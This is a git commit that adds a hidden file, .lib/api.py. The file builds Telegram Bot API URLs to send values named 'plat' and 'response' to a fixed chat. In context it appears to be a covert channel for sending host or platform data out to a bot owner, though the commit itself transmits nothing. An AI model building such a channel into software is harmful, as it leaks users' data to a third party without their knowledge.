a68e3b3eb9de7394487456cc88994e015d7c2cdc
z0roday <100026917+z0roday@users.noreply.github.com>
2024-09-19 07:58:15 -0700

    add lib

---
+++ .lib/api.py
@@ -0,0 +1,6 @@
+from plt import tkn , zdy, plat, response
+
+api = f"https://api.telegram.org/bot{tkn}/sendMessage?chat_id={zdy}&text={plat}"
+
+api2 = f"https://api.telegram.org/bot{tkn}/sendMessage?chat_id={zdy}&text={response}"
+
